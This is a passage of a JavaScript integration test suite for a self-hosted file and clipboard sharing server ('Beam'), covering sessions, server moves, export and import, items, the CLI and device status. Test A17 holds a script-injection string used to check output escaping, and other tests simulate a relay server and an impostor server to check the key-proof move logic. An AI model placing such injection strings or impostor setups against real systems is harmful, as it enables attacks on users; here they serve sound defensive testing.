    assert.equal(hello.proof, crypto.createHmac('sha256', h1).update(`${hello.serverId}:${nonce}`).digest('hex'));
    const h2 = crypto.createHash('sha256').update(migration).digest();
    const tid2 = crypto.createHash('sha256').update(h2).digest('hex').slice(0, 16);
    assert.equal((await s.req('GET', `/api/hello?nonce=${nonce}&tid=${tid2}`)).json.proof, crypto.createHmac('sha256', h2).update(`${hello.serverId}:${nonce}`).digest('hex'));
    assert.equal((await s.req('GET', `/api/hello?nonce=${nonce}&tid=0000000000000000`)).json.proof, undefined);
    // sign out everything else
    const phoneKey = (await post(s, '/api/login', { secret: 'password one', client: 'app', deviceId: 'phone000009' }, from('100.64.1.3'))).json.key;
    r = await s.req('POST', '/api/security/sign-out-others', { headers: app(migration, 'adminapp001') });
    assert.equal(r.status, 200);
    const fresh = r.json.key;
    assert.equal((await s.req('GET', '/api/me', { headers: app(K, 'adminapp001') })).status, 401, 'the old master key is gone');
    assert.equal((await s.req('GET', '/api/me', { headers: app(phoneKey, 'phone000009') })).status, 401);
    assert.equal((await s.req('GET', '/api/me', { headers: app(migration, 'adminapp001') })).status, 401);
    assert.equal((await s.req('GET', '/api/me', { headers: app(fresh, 'adminapp001') })).status, 200);
    assert.notEqual(s.key, K, 'data/key was rotated');
  } finally { await s.stop(); }
});

test('C6: session sign-ins end with the browser and after 12 h idle; their devices are forgotten', async () => {
  let s = await startServer('session', 8791);
  const K = s.key;
  try {
    await post(s, '/api/password', { password: 'session pass' }, app(K, 'sessadmin01'));
    const r = await post(s, '/api/login', { secret: 'session pass', remember: false }, { ...sameOrigin, Cookie: 'beam_device_id=borrowed001' });
    assert.equal(r.status, 204);
    const setCookie = [].concat(r.headers['set-cookie']).join('');
    assert.doesNotMatch(setCookie, /Max-Age/, 'a session cookie');
    await s.req('GET', '/api/me', { headers: cookie(cookieValue(r), 'borrowed001', { 'X-Beam-Platform': 'web', 'X-Beam-Device': 'Library PC' }) });
    const devs = (await s.req('GET', '/api/devices', { headers: app(K, 'sessadmin01') })).json.devices;
    assert.equal(devs.find(d => d.id === 'borrowed001').temporary, true);
    await sleep(500); // let devices.json be written (the test kills the server hard)
  } finally { await s.stop(); }
  const file = path.join(s.data, 'tokens.json');
  const store = JSON.parse(fs.readFileSync(file, 'utf8'));
  for (const t of Object.values(store.tokens)) if (t.session) t.lastUsed = Date.now() - 13 * 3600e3;
  fs.writeFileSync(file, JSON.stringify(store));
  s = await startServer('session', 8791, { keep: true });
  try {
    const devs = (await s.req('GET', '/api/devices', { headers: app(K, 'sessadmin01') })).json.devices;
    assert.equal(devs.find(d => d.id === 'borrowed001'), undefined);
    assert.match(s.out, /Forgot the temporary device "Library PC"/);
  } finally { await s.stop(); }
});

// ---------------------------------------------------------------- B4 moving

function copyDir(src, dest) {
  fs.mkdirSync(dest, { recursive: true });
  for (const entry of fs.readdirSync(src, { withFileTypes: true })) {
    if (entry.name === 'logs' || entry.name === 'server.pid') continue;
    const a = path.join(src, entry.name);
    const b = path.join(dest, entry.name);
    entry.isDirectory() ? copyDir(a, b) : fs.copyFileSync(a, b);
  }
}

test('B4: moving: verified target, 410 + moved event, handoff for signed-in browsers, undo', async () => {
  const old = await startServer('move-old', 8792);
  let neu;
  const other = await startServer('move-other', 8796);
  try {
    const K = old.key;
    const h = app(K, 'movedev0001', 'Mover');
    await sendText(old, h, 'before the move');
    await sleep(300);
    fs.rmSync(path.join(TMP, 'move-new'), { recursive: true, force: true });
    copyDir(old.data, path.join(TMP, 'move-new', 'data'));
    neu = await startServer('move-new', 8793, { keep: true });
    let r = await post(old, '/api/move', { to: `http://127.0.0.1:${other.port}` }, h);
    assert.equal(r.status, 409, 'a different Beam');
    assert.match(r.json.error, /different Beam/);
    r = await post(old, '/api/move', { to: 'http://127.0.0.1:8799' }, h);
    assert.equal(r.status, 409, 'nobody there');
    const ev = await openEvents(old.port, app(K, 'listener001', 'L', 'android'));
    await ev.wait('hello');
    const login = await post(old, '/api/login', { secret: K }, { ...sameOrigin, Cookie: 'beam_device_id=browser0009' });
    const browserCookie = cookieValue(login);
    r = await post(old, '/api/move', { to: `http://127.0.0.1:${neu.port}` }, h);
    assert.equal(r.status, 200, r.body);
    await ev.wait('moved', d => d.movedTo === `http://127.0.0.1:${neu.port}`);
    r = await old.req('GET', '/api/items', { headers: h });
    assert.equal(r.status, 410);
    assert.equal(r.json.movedTo, `http://127.0.0.1:${neu.port}`);
    assert.equal((await old.req('GET', '/api/hello')).json.movedTo, `http://127.0.0.1:${neu.port}`);
    // browsers
    r = await old.req('GET', '/', { headers: { Cookie: `beam_key=${browserCookie}` } });
    assert.match(r.headers['content-security-policy'], /script-src 'self'/);
    const handoff = /name="beam-handoff" content="([^"]+)"/.exec(r.body)?.[1];
    assert.ok(handoff, 'signed-in browsers get a handoff');
    assert.match(r.body, /<script src="moved\.js">/); // relative, so it also works under a path prefix
    assert.equal((await old.req('GET', '/moved.js')).status, 200);
    r = await old.req('GET', '/');
    assert.doesNotMatch(r.body, /beam-handoff/, 'strangers do not');
    r = await post(neu, '/api/login', { handoff: handoff.replace(/&#(\d+);/g, (_, c) => String.fromCharCode(c)) }, { ...sameOrigin, Cookie: 'beam_device_id=browser0009' });
    assert.equal(r.status, 204, r.body);
    assert.ok(cookieValue(r).startsWith('bt_'));
    r = await post(neu, '/api/login', { handoff }, sameOrigin);
    assert.equal(r.status, 403, 'a handoff works once');
    assert.equal((await neu.req('GET', '/api/items', { headers: h })).json.items[0].text, 'before the move');
    // undo with the master key, from the command line
    const undo = await runNode(['moved-to', '--clear'], serverEnv(8792, old.dir));
    assert.equal(undo.code, 0, undo.out);
    assert.equal((await old.req('GET', '/api/items', { headers: h })).status, 200);
    const force = await runNode(['moved-to', 'https://nowhere.example', '--force'], serverEnv(8792, old.dir));
    assert.equal(force.code, 0, force.out);
    assert.equal((await old.req('GET', '/api/items', { headers: h })).status, 410);
    ev.close();
  } finally { await old.stop(); await neu?.stop(); await other.stop(); }
});

test('B4b: a stranger can’t pass the move check by relaying it to this Beam; no proofs once moved (1.6.2)', async () => {
  const old = await startServer('relay-old', 8792);
  // The stranger answers /api/hello by asking the real Beam (same nonce and tid) and changing only its instance id.
  const relay = http.createServer((req, res) => {
    http.get({ host: '127.0.0.1', port: 8792, path: req.url, agent: false }, up => {
      let body = '';
      up.on('data', d => { body += d; });
      up.on('end', () => {
        const json = JSON.parse(body);
        json.instance = 'f'.repeat(16);
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify(json));
      });
    }).on('error', () => res.destroy());
  });
  await new Promise(r => relay.listen(8797, '127.0.0.1', r));
  let neu;
  try {
    const K = old.key;
    const h = app(K, 'relaydev001', 'Mover');
    const tid = crypto.createHash('sha256').update(crypto.createHash('sha256').update(K).digest()).digest('hex').slice(0, 16);
    assert.ok((await old.req('GET', `/api/hello?nonce=abcdefgh12&tid=${tid}`)).json.proof, 'proofs for callers’ own nonces, as before');
    const r = await post(old, '/api/move', { to: 'http://127.0.0.1:8797' }, h);
    assert.equal(r.status, 409, `the relayed check fails: ${r.body}`);
    assert.match(r.json.error, /doesn.t hold this Beam.s key/);
    assert.equal((await old.req('GET', '/api/items', { headers: h })).status, 200, 'not moved');
    // A real move; after it this Beam proves nothing to anyone (a stranger's address can't borrow its proofs).
    fs.rmSync(path.join(TMP, 'relay-new'), { recursive: true, force: true });
    copyDir(old.data, path.join(TMP, 'relay-new', 'data'));
    neu = await startServer('relay-new', 8793, { keep: true });
    assert.equal((await post(old, '/api/move', { to: `http://127.0.0.1:${neu.port}` }, h)).status, 200);
    const after = (await old.req('GET', `/api/hello?nonce=abcdefgh13&tid=${tid}`)).json;
    assert.ok(after.movedTo && !after.proof, `moved: no proof (${JSON.stringify(after)})`);
    assert.ok((await neu.req('GET', `/api/hello?nonce=abcdefgh14&tid=${tid}`)).json.proof, 'the new server proves it');
  } finally { await old.stop(); await neu?.stop(); await new Promise(r => relay.close(r)); }
});

test('B4: a Beam in a userspace-Tailscale container reaches tailnet addresses through BEAM_TAILNET_PROXY', async () => {
  // A stand-in for tailscaled's outbound HTTP proxy: 100.64.77.1:<port> is this machine.
  const seen = [];
  const proxy = http.createServer((req, res) => {
    const target = new URL(req.url);
    seen.push(target.host);
    const upstream = http.request({ host: '127.0.0.1', port: target.port, method: req.method, path: target.pathname + target.search, headers: req.headers }, up => {
      res.writeHead(up.statusCode, up.headers);
      up.pipe(res);
    });
    req.pipe(upstream);
  });
  await new Promise(r => proxy.listen(8797, '127.0.0.1', r));
  const old = await startServer('proxy-old', 8792, { env: { BEAM_TAILNET_PROXY: 'http://127.0.0.1:8797' } });
  let neu;
  try {
    const h = app(old.key, 'proxymove01');
    await sendText(old, h, 'x');
    await sleep(300);
    fs.rmSync(path.join(TMP, 'proxy-new'), { recursive: true, force: true });
    copyDir(old.data, path.join(TMP, 'proxy-new', 'data'));
    neu = await startServer('proxy-new', 8793, { keep: true });
    const r = await post(old, '/api/move', { to: 'http://100.64.77.1:8793' }, h);
    assert.equal(r.status, 200, r.body);
    assert.ok(seen.includes('100.64.77.1:8793'), 'went through the proxy');
  } finally { await old.stop(); await neu?.stop(); await new Promise(r => proxy.close(r)); }
});

test('A17: the moved page escapes the address', async () => {
  const s = await startServer('moved-escape', 8791, { env: { BEAM_MOVED_TO: 'https://x.example/"><script>alert(1)</script>' } });
  try {
    const r = await s.req('GET', '/');
    assert.doesNotMatch(r.body, /<script>alert/);
    assert.match(r.headers['content-security-policy'], /default-src 'none'/);
    assert.equal((await s.req('GET', '/app.js')).status, 410, 'old scripts are not replaced by the page');
  } finally { await s.stop(); }
});

// ---------------------------------------------------------------- B5 export / import

test('B5: export and import round trip; import refuses a used data folder; tar sizes over 8 GiB', async () => {
  const s = await startServer('export', 8791);
  const K = s.key;
  const h = app(K, 'exportdev01', 'Exporter');
  let exported;
  try {
    await sendText(s, h, 'short');
    await sendText(s, h, 'z'.repeat(80_000));
    const f = await upload(s, h, 'pic.jpg', crypto.randomBytes(50_000));
    await s.req('PUT', `/api/items/${f.id}/thumb`, { headers: { ...h, 'Content-Type': 'image/jpeg' }, body: Buffer.from([0xff, 0xd8, 0xff, 0xe0, 1, 2, 3]) });
    fs.writeFileSync(path.join(s.dist, 'Beam.exe'), 'MZ');
    fs.writeFileSync(path.join(s.dist, 'Beam.exe.json'), '{"version":"1.3.0"}');
    const r = await s.req('GET', '/api/admin/export', { headers: h, raw: true });
    assert.equal(r.status, 200);
    exported = r.body;
    const names = tarNames(exported);
    assert.equal(names[0], 'beam-export.json');
    assert.equal(names.at(-1), 'items.json');
    for (const n of ['key', 'server-id', 'tokens.json', `files/${f.id}`, `thumbs/${f.id}`, 'apps/Beam.exe', 'apps/Beam.exe.json']) assert.ok(names.includes(n), n);
    assert.ok(names.some(n => n.startsWith('texts/')));
    const tokenOnly = (await s.req('GET', '/api/me', { headers: h })).headers['x-beam-token'];
    assert.equal((await s.req('GET', '/api/admin/export', { headers: app(tokenOnly, 'exportdev01') })).status, 403, 'device tokens cannot export');
  } finally { await s.stop(); }
  const file = path.join(TMP, 'export.tar.gz');
  fs.writeFileSync(file, exported);
  const target = path.join(TMP, 'import');
  fs.rmSync(target, { recursive: true, force: true });
  let run = await runNode(['import', file], serverEnv(8792, target));
  assert.equal(run.code, 0, run.out);
  run = await runNode(['import', file], serverEnv(8792, target));
  assert.notEqual(run.code, 0, 'refuses a data folder that already holds a Beam');
  assert.match(run.out, /--force/);
  run = await runNode(['import', file, '--force'], serverEnv(8792, target));
  assert.equal(run.code, 0, run.out);
  assert.ok(fs.readdirSync(path.join(target, 'data')).some(n => n.startsWith('replaced-')), 'the old contents were set aside');
  const t = await startServer('import', 8792, { keep: true });
  try {
    assert.equal(t.key, K);
    const items = (await t.req('GET', '/api/items', { headers: h })).json.items;
    assert.equal(items.length, 3);
    const pic = items.find(i => i.name === 'pic.jpg');
    assert.equal(pic.thumb, true);
    assert.equal((await t.req('GET', `/api/file/${pic.id}`, { headers: h, raw: true })).body.length, 50_000);
    const big = items.find(i => i.truncated);
    assert.equal((await t.req('GET', `/api/items/${big.id}/text`, { headers: h })).body.length, 80_000);
    assert.ok(fs.existsSync(path.join(t.dist, 'Beam.exe')), 'app builds came along');
    // offline export of a stopped server
    await t.stop();
    run = await runNode(['export', path.join(TMP, 'offline.tar.gz')], serverEnv(8792, target));
    assert.equal(run.code, 0, run.out);
    assert.ok(tarNames(fs.readFileSync(path.join(TMP, 'offline.tar.gz'))).includes('items.json'));
  } finally { await t.stop(); }
  // base-256 sizes (files of 8 GiB and more)
  const tar = require(path.join(ROOT, 'lib', 'tar.js'));
  const hdr = tar.header('files/0123456789abcdef', 9 * 1024 ** 3, Date.now());
  const gz = zlib.gzipSync(Buffer.concat([hdr, Buffer.alloc(512)]));
  const { Readable } = require('node:stream');
  const it = tar.entries(Readable.from([gz]))[Symbol.asyncIterator]();
  const first = await it.next();
  assert.equal(first.value.size, 9 * 1024 ** 3);
  await it.return();
});

test('B5: import-from copies a running Beam after approval and moves everyone over', async () => {
  const old = await startServer('if-old', 8796);
  let neu;
  try {
    const K = old.key;
    const h = app(K, 'ifdevice001', 'Desk');
    await sendText(old, h, 'carry me');
    await upload(old, h, 'doc.pdf', crypto.randomBytes(20_000));
    const target = path.join(TMP, 'if-new');
    fs.rmSync(target, { recursive: true, force: true });
    const running = runNode(['import-from', `http://127.0.0.1:${old.port}`, '--public-url', 'http://127.0.0.1:8795'], serverEnv(8795, target));
    const request = await waitFor(async () => (await old.req('GET', '/api/login-requests', { headers: h })).json.requests.find(r => r.purpose === 'move'), 15000);
    assert.match(request.name, /Move Beam to/);
    await post(old, '/api/login-requests/approve', { code: request.code }, h);
    const result = await running;
    assert.equal(result.code, 0, result.out);
    const frozen = await post(old, '/api/text', { text: 'during the move' }, h);
    assert.equal(frozen.status, 503, 'changes wait while the move is pending');
    neu = await startServer('if-new', 8795, { keep: true });
    await waitFor(async () => (await old.req('GET', '/api/items', { headers: h })).status === 410, 15000);
    const items = (await neu.req('GET', '/api/items', { headers: h })).json.items;
    assert.equal(items.length, 2);
    assert.ok(!fs.readFileSync(path.join(target, 'data', 'tokens.json'), 'utf8').includes('"scope":"move"'), 'the move sign-in is not kept');
  } finally { await old.stop(); await neu?.stop(); }
});

// ---------------------------------------------------------------- B6–B9, C5 items

test('B6–B9: forward, bulk delete, pin, read markers', async () => {
  const s = await startServer('items', 8791);
  try {
    const K = s.key;
    const a = app(K, 'itemsaaa001', 'A');
    const b = app(K, 'itemsbbb001', 'B', 'android');
    await s.req('GET', '/api/me', { headers: b });
    const ev = await openEvents(s.port, b);
    const f = await upload(s, a, 'big.bin', crypto.randomBytes(100_000), { to: ['itemsaaa001'] });
    let r = await post(s, `/api/items/${f.id}/forward`, { to: ['B'] }, a);
    assert.equal(r.status, 201);
    assert.deepEqual(r.json.to, ['itemsbbb001']);
    assert.equal(r.json.forwardedFrom, f.id);
    assert.equal(fs.statSync(path.join(s.data, 'files', r.json.id)).nlink, 2, 'hard-linked, not copied');
    const t = await sendText(s, a, 'forward me');
    r = await post(s, `/api/items/${t.id}/forward`, {}, b);
    assert.equal(r.json.text, 'forward me');
    assert.equal(r.json.from, 'itemsbbb001');
    await s.req('POST', `/api/items/${t.id}/ack`, { headers: b });
    r = await s.req('PATCH', `/api/items/${t.id}`, { headers: json(a), body: JSON.stringify({ pinned: true }) });
    assert.equal(r.json.pinned, true);
    const upd = await ev.wait('update', d => d.id === t.id && d.pinned);
    assert.ok(upd.data.delivered.itemsbbb001, 'pin updates keep the delivered map');
    assert.equal((await s.req('PATCH', `/api/items/${t.id}`, { headers: json(a), body: JSON.stringify({ text: 'x' }) })).status, 400);
    r = await post(s, '/api/items/delete', { ids: [f.id, t.id, 'ffffffffffffffff'] }, a);
    assert.equal(r.json.deleted, 2);
    await ev.wait('delete', d => d.id === f.id);
    r = await s.req('PUT', '/api/read', { headers: json(b), body: JSON.stringify({ conversation: 'itemsaaa001', ts: 5000 }) });
    assert.equal(r.json.read.itemsaaa001, 5000);
    await ev.wait('read', d => d.device === 'itemsbbb001' && d.ts === 5000);
    await s.req('PUT', '/api/read', { headers: json(b), body: JSON.stringify({ conversation: 'itemsaaa001', ts: 10 }) });
    assert.equal((await s.req('GET', '/api/me', { headers: b })).json.read.itemsaaa001, 5000, 'markers only move forward');
    assert.equal((await s.req('PUT', '/api/read', { headers: json(b), body: JSON.stringify({ conversation: 'nope', ts: 1 }) })).status, 400);
    ev.close();
  } finally { await s.stop(); }
});

test('C5/C9: thumbnails and upload progress events', async () => {
  const s = await startServer('thumbs', 8791);
  try {
    const K = s.key;
    const a = app(K, 'thumbaaa001', 'A');
    const ev = await openEvents(s.port, app(K, 'thumbbbb001', 'B', 'android'));
    const init = await post(s, '/api/uploads', { name: 'photo.jpg', size: 3_000_000, w: 4000, h: 3000 }, a);
    await ev.wait('upload', d => d.id === init.json.id && d.offset === 0 && d.name === 'photo.jpg');
    const put = await s.req('PUT', `/api/uploads/${init.json.id}?offset=0`, { headers: { ...a, 'Content-Type': 'application/octet-stream' }, body: crypto.randomBytes(3_000_000) });
    assert.equal(put.status, 201);
    await ev.wait('upload-done', d => d.id === init.json.id);
    const item = put.json.item;
    assert.equal(item.w, 4000);
    const jpeg = Buffer.concat([Buffer.from([0xff, 0xd8, 0xff, 0xe0]), crypto.randomBytes(1000)]);
    let r = await s.req('PUT', `/api/items/${item.id}/thumb`, { headers: { ...a, 'Content-Type': 'image/jpeg' }, body: jpeg });
    assert.equal(r.status, 204);
    await ev.wait('update', d => d.id === item.id && d.thumb === true && d.delivered);
    r = await s.req('GET', `/api/items/${item.id}/thumb`, { headers: a, raw: true });
    assert.equal(r.headers['content-type'], 'image/jpeg');
    assert.equal(Buffer.compare(r.body, jpeg), 0);
    assert.equal((await s.req('PUT', `/api/items/${item.id}/thumb`, { headers: { ...a, 'Content-Type': 'image/jpeg' }, body: 'not a jpeg' })).status, 400);
    assert.equal((await s.req('PUT', `/api/items/${item.id}/thumb`, { headers: { ...a, 'Content-Type': 'image/png' }, body: jpeg })).status, 415);
    // Too big: a 413, or a reset when the server closes the connection before the rest of the body arrives (closing
    // with unread data resets it; a timing artifact). Either way the stored thumbnail is unchanged.
    r = await s.req('PUT', `/api/items/${item.id}/thumb`, { headers: { ...a, 'Content-Type': 'image/jpeg' }, body: Buffer.alloc(300_000, 0xff) });
    assert.ok([413, 'reset'].includes(r.status), `oversize thumbnail: ${r.status}`);
    assert.equal(Buffer.compare((await s.req('GET', `/api/items/${item.id}/thumb`, { headers: a, raw: true })).body, jpeg), 0, 'the old thumbnail stays');
    const doc = (await s.req('PUT', '/api/file?name=a.pdf', { headers: a, body: 'x' })).json;
    assert.equal((await s.req('PUT', `/api/items/${doc.id}/thumb`, { headers: { ...a, 'Content-Type': 'image/jpeg' }, body: jpeg })).status, 400);
    const fwd = (await post(s, `/api/items/${item.id}/forward`, {}, a)).json;
    assert.equal(fwd.thumb, true);
    await s.req('DELETE', `/api/items/${item.id}`, { headers: a });
    await sleep(200);
    assert.ok(!fs.existsSync(path.join(s.data, 'thumbs', item.id)));
    assert.ok(fs.existsSync(path.join(s.data, 'thumbs', fwd.id)));
    const init2 = await post(s, '/api/uploads', { name: 'x.bin', size: 10 }, a);
    await s.req('DELETE', `/api/uploads/${init2.json.id}`, { headers: a });
    await ev.wait('upload-cancelled', d => d.id === init2.json.id);
    ev.close();
  } finally { await s.stop(); }
});

// ---------------------------------------------------------------- C1–C4 static, logout, me

test('C2–C4: static caching and gzip, security headers, logout clears the site, machine name', async () => {
  const s = await startServer('static', 8791);
  try {
    let r = await s.req('GET', '/', { headers: { 'Accept-Encoding': 'gzip' }, raw: true });
    assert.equal(r.headers['content-encoding'], 'gzip');
    assert.match(zlib.gunzipSync(r.body).toString('utf8'), /<html|<!doctype/i);
    assert.match(r.headers['content-security-policy'], /object-src 'none'.*frame-src 'self'.*worker-src 'self'/);
    assert.equal(r.headers['cross-origin-opener-policy'], 'same-origin');
    assert.equal(r.headers['cache-control'], 'no-cache');
    const again = await s.req('GET', '/', { headers: { 'If-None-Match': r.headers.etag } });
    assert.equal(again.status, 304);
    const K = s.key;
    const login = await post(s, '/api/login', { secret: K }, { ...sameOrigin, Cookie: 'beam_device_id=staticbr001' });
    r = await s.req('POST', '/api/logout', { headers: { ...cookie(cookieValue(login), 'staticbr001'), ...sameOrigin } });
    assert.equal(r.headers['clear-site-data'], '"cache", "storage"');
    assert.equal((await s.req('GET', '/api/me', { headers: cookie(cookieValue(login), 'staticbr001') })).status, 401, 'logout revokes the token');
    r = await s.req('GET', '/api/me', { headers: app(K, 'staticapp01') });
    assert.ok(r.json.machine?.name, 'the server knows its own name');
  } finally { await s.stop(); }
});

// ---------------------------------------------------------------- CLI (A21)
// The CLI runs with a scratch home folder, so it never sees a real ~/.beam.json. Nothing here touches the
// clipboard, notifications or the browser (get/listen use --no-copy/--no-notify; clip and open are not run).

function cli(args, { home, env = {}, timeout = 60000 } = {}) {
  return new Promise(resolve => {
    const child = spawn(process.execPath, [path.join(ROOT, 'cli', 'beam.js'), ...args], {
      env: cleanEnv({ USERPROFILE: home, HOME: home, ...env }), stdio: ['ignore', 'pipe', 'pipe'], windowsHide: true,
    });
    children.add(child);
    let out = '';
    child.stdout.on('data', d => { out += d; });
    child.stderr.on('data', d => { out += d; });
    const timer = setTimeout(() => child.kill(), timeout);
    child.on('exit', code => { clearTimeout(timer); children.delete(child); resolve({ code, out, child }); });
    resolve.child = child;
  });
}

const homeDir = name => {
  const dir = path.join(TMP, `home-${name}`);
  fs.rmSync(dir, { recursive: true, force: true });
  fs.mkdirSync(dir, { recursive: true });
  return dir;
};
const cliConfig = home => JSON.parse(fs.readFileSync(path.join(home, '.beam.json'), 'utf8'));

test('A21 CLI: friendly option errors, stable id for env-only runs, token switch, adopting its id', async () => {
  const s = await startServer('cli1', 8791);
  try {
    const K = s.key;
    const base = `http://127.0.0.1:${s.port}`;
    const home = homeDir('cli1');
    let r = await cli(['--too', 'x'], { home });
    assert.equal(r.code, 2);
    assert.match(r.out, /Unknown option '--too'/);
    assert.doesNotMatch(r.out, /at parseArgs|node:internal/);
    const envOnly = { BEAM_URL: base, BEAM_KEY: K };
    await cli(['devices'], { home: homeDir('cli1-env'), env: envOnly });
    await cli(['devices'], { home: homeDir('cli1-env'), env: envOnly });
    let devs = (await s.req('GET', '/api/devices', { headers: app(K, 'observer001') })).json.devices;
    assert.equal(devs.filter(d => d.platform === 'cli').length, 1, 'one device, not one per run');
    r = await cli(['setup', `${base}/?key=${K}`, '--name', 'Laptop'], { home });
    assert.equal(r.code, 0, r.out);
    await cli(['devices'], { home });
    assert.ok(cliConfig(home).key.startsWith('bt_'), 'switched from the master key to its own token');
    const id = cliConfig(home).deviceId;
    fs.writeFileSync(path.join(home, '.beam.json'), JSON.stringify({ ...cliConfig(home), deviceId: 'somethingelse1' }));
    r = await cli(['devices'], { home });
    assert.equal(cliConfig(home).deviceId, id, 'adopted the id its token belongs to');
    assert.match(r.out, /Laptop .*\(this computer\)/);
    r = await cli(['status'], { home });
    assert.match(r.out, /its own token/);
    assert.match(r.out, /API 3/);
  } finally { await s.stop(); }
});

test('A21 CLI: login by approval and by password, approve, rm, get --no-copy, listen catches up', async () => {
  const s = await startServer('cli2', 8791);
  try {
    const K = s.key;
    const base = `http://127.0.0.1:${s.port}`;
    const admin = app(K, 'cliadmin001', 'Admin');
    const home = homeDir('cli2');
    const pending = cli(['login', base, '--name', 'Work laptop'], { home });
    const request = await waitFor(async () => (await s.req('GET', '/api/login-requests', { headers: admin })).json.requests.find(q => q.name === 'Work laptop'), 15000);
    assert.equal(request.platform, 'cli');
    assert.ok(request.deviceId);
    await post(s, '/api/login-requests/approve', { code: request.code }, admin);
    let r = await pending;
    assert.equal(r.code, 0, r.out);
    assert.match(r.out, /Signed in to .* as "Work laptop" \(approved by Admin\)/);
    assert.ok(cliConfig(home).key.startsWith('bt_'));
    // approve someone else from the command line
    const lr = (await post(s, '/api/login-requests', { name: 'Tablet' }, from('100.64.9.1'))).json;
    r = await cli(['approve', lr.code, '--yes'], { home });
    assert.equal(r.code, 0, r.out);
    assert.equal((await s.req('GET', `/api/login-requests/${lr.id}`, { headers: { 'X-Beam-Login-Secret': lr.secret } })).json.status, 'approved');
    // password sign-in
    await post(s, '/api/password', { password: 'cli password' }, admin);
    const home2 = homeDir('cli2b');
    r = await cli(['login', base, '--password'], { home: home2, env: { BEAM_PASSWORD: 'cli password' } });
    assert.equal(r.code, 0, r.out);
    // get (without the clipboard) acknowledges; rm by id prefix
    const me = cliConfig(home).deviceId;
    const t = await sendText(s, admin, 'for the laptop', [me]);
    r = await cli(['get', '--no-copy'], { home });
    assert.match(r.out, /for the laptop/);
    assert.ok((await s.req('GET', `/api/items/${t.id}`, { headers: admin })).json.delivered[me], 'beam get acknowledges');
    r = await cli(['ls'], { home });
    assert.ok(r.out.includes(t.id.slice(0, 8)));
    r = await cli(['rm', t.id.slice(0, 6)], { home });
    assert.equal(r.code, 0, r.out);
    assert.equal((await s.req('GET', `/api/items/${t.id}`, { headers: admin })).status, 404);
    // listen picks up what arrived while it wasn't running
    const missed = await sendText(s, admin, 'sent while you were away', [me]);
    const listening = cli(['listen', '--no-copy', '--no-notify', '--no-save'], { home, timeout: 8000 });
    await waitFor(async () => (await s.req('GET', `/api/items/${missed.id}`, { headers: admin })).json.delivered[me], 7000);
    r = await listening;
    assert.match(r.out, /sent while you were away/);
  } finally { await s.stop(); }
});

test('A21 CLI: follows a move only when the new server proves it holds the key', async () => {
  const old = await startServer('cli-move-old', 8792);
  let neu;
  let impostor;
  try {
    const K = old.key;
    const home = homeDir('cli3');
    let r = await cli(['setup', `http://127.0.0.1:${old.port}/?key=${K}`, '--name', 'Mover'], { home });
    assert.equal(r.code, 0, r.out);
    await cli(['devices'], { home });
    await sleep(300);
    fs.rmSync(path.join(TMP, 'cli-move-new'), { recursive: true, force: true });
    copyDir(old.data, path.join(TMP, 'cli-move-new', 'data'));
    neu = await startServer('cli-move-new', 8793, { keep: true });
    // an impostor with the same server id but not the key
    fs.rmSync(path.join(TMP, 'cli-imp'), { recursive: true, force: true });
    fs.mkdirSync(path.join(TMP, 'cli-imp', 'data'), { recursive: true });
    fs.copyFileSync(path.join(old.data, 'server-id'), path.join(TMP, 'cli-imp', 'data', 'server-id'));
    impostor = await startServer('cli-imp', 8796, { keep: true });
    await runNode(['moved-to', `http://127.0.0.1:${impostor.port}`, '--force'], serverEnv(8792, old.dir));
    r = await cli(['devices'], { home });
    assert.notEqual(r.code, 0);
    assert.equal(cliConfig(home).url, `http://127.0.0.1:${old.port}`, 'did not follow the impostor');
    await runNode(['moved-to', '--clear'], serverEnv(8792, old.dir));
    await runNode(['moved-to', `http://127.0.0.1:${neu.port}`], serverEnv(8792, old.dir));
    r = await cli(['devices'], { home });
    assert.equal(r.code, 0, r.out);
    assert.equal(cliConfig(home).url, `http://127.0.0.1:${neu.port}`);
    assert.match(r.out, /Beam moved to/);
  } finally { await old.stop(); await neu?.stop(); await impostor?.stop(); }
});

// ---------------------------------------------------------------- quick wins (1.3): status, ring, wake, Remote Desktop, alerts

const MAC1 = '0a:1b:2c:3d:4e:5f';
const MAC2 = '0A-1B-2C-3D-4E-60';

test('QW-A: device status is stored, shown without MAC addresses, and validated', async () => {
  const ts = await fakeTailscale({ peers: [{ name: 'gaming-pc', ips: ['100.64.50.1', 'fd7a:115c:a1e0::50:1'], dns: 'gaming-pc.tail1234.ts.net.' }] });
  const s = await startServer('qw-status', 8791, { env: { BEAM_TAILSCALE: '', BEAM_TAILSCALE_SOCKET: ts.socket } });
  try {
    const K = s.key;
    const v13 = { 'X-Beam-App-Version': '1.3.0' };
    const pc = app(K, 'gamingpc001', 'Gaming PC', 'windows', { ...from('100.64.50.1'), ...v13 });
    const phone = app(K, 'phone000001', 'Pixel', 'android', { ...from('100.64.50.2'), ...v13 });
    await s.req('GET', '/api/me', { headers: phone });
    const ev = await openEvents(s.port, phone);
    await ev.wait('hello');
    const put = body => s.req('PUT', '/api/devices/me/status', { headers: json(pc), body: JSON.stringify(body) });
    let r = await put({ battery: { level: 80, charging: true }, storage: { free: 200e9, total: 500e9 }, os: 'Windows 11 Pro 24H2', macs: [MAC1, MAC2], remoteDesktop: true });
    assert.equal(r.status, 204, r.body);
    const devs = (await s.req('GET', '/api/devices', { headers: phone })).json.devices;
    const d = devs.find(x => x.id === 'gamingpc001');
    assert.deepEqual(d.status.battery, { level: 80, charging: true });
    assert.equal(d.status.os, 'Windows 11 Pro 24H2');
    assert.ok(d.status.at > 0);
    assert.equal(d.status.macs, undefined);
    assert.deepEqual(d.tailscale, { name: 'gaming-pc', dns: 'gaming-pc.tail1234.ts.net', ip: '100.64.50.1' });
    assert.deepEqual(d.can, { ring: true, wake: true, remoteDesktop: true, remoteControl: false });
    assert.deepEqual(devs.find(x => x.id === 'phone000001').can, { ring: true, wake: false, remoteDesktop: false, remoteControl: false });
    // a partial report keeps the rest; null clears a field
    r = await put({ battery: null });
    assert.equal(r.status, 204);
    const after = (await s.req('GET', '/api/devices', { headers: phone })).json.devices.find(x => x.id === 'gamingpc001');
    assert.equal(after.status.battery, undefined);
    assert.equal(after.status.os, 'Windows 11 Pro 24H2');
    // MAC addresses never leave the server, in any form
    const macRe = /0a[:-]?1b[:-]?2c|0A[:-]?1B[:-]?2C/i;
    await sleep(400);
    for (const route of ['/api/devices', '/api/me', '/api/info', '/api/settings', '/api/items', '/api/alerts', '/api/logs?lines=500']) {
      const body = (await s.req('GET', route, { headers: phone })).body;
      assert.doesNotMatch(body, macRe, route);
    }
